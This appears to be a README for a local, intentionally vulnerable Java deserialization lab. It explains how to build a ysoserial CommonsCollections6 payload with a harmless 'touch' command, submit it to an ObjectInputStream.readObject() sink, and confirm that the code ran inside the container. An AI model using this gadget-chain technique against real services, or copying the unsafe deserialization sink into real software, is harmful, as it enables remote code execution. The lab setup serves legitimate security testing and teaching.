# Java native serialized objects + Commons Collections — port 8085

- Browser: http://127.0.0.1:8085
- Input: Base64 of **native Java serialized bytes** (serialized data starts with `AC ED 00 05` before Base64 encoding)
- Unsafe sink: `ObjectInputStream.readObject()`
- Image: Java 8 + `commons-collections:3.2.1`
- Candidate generator: `ysoserial` **CommonsCollections6** (all-in-one JAR **not included**)

## Start just this container

```powershell
docker compose up --build -d java-native
```

## Produce the Base64 payload (binary-safe PowerShell method)

Place `ysoserial-all.jar` in the current shell directory, with `java` and `python` on `PATH`:

```powershell
python -c "import base64,subprocess; p=subprocess.check_output(['java','-jar','ysoserial-all.jar','CommonsCollections6','touch /tmp/cc6-proof']); print(base64.b64encode(p).decode('ascii'))"
```

**Why Python wraps Java here:** `ysoserial` emits raw binary serialized bytes on stdout. Redirecting native stdout directly in some PowerShell versions can corrupt binary output. `subprocess.check_output()` safely captures bytes, then Base64-encodes them into a copyable line.

Paste **only** the resulting Base64 string into the form at 8085 and select **Deserialize**. `touch /tmp/cc6-proof` runs **inside the Java container** when the gadget triggers.

## Verify the side effect

```powershell
docker compose exec java-native ls -l /tmp/cc6-proof
# Optionally inspect the service output
docker compose logs --tail=100 java-native
```

If the file exists, the test command executed. A gadget may trigger the side effect then throw an exception; a failed `readObject()` return alone does not prove the gadget did not execute. To reset the test without deleting your working tree:

```powershell
docker compose restart java-native
```

Note: `restart` does **not** necessarily clear `/tmp` contents; `docker compose down` followed by `docker compose up -d java-native` recreates the container if you need a fresh ephemeral filesystem.

## Distinguish this from Jackson JSON (8081)

Port **8085** consumes Java's binary serialization format through `ObjectInputStream`, while port **8081** consumes JSON via Jackson `ObjectMapper`. **Do not** paste `ysoserial` Base64 into the Jackson JSON form; it is the wrong format and entry point. Gadget/JDK compatibility may vary; a candidate payload is not guaranteed to work on every runtime. Do not expose the vulnerable port outside host loopback.


For normal vs gadget payloads and comparison, see [../payloads.md](../payloads.md).
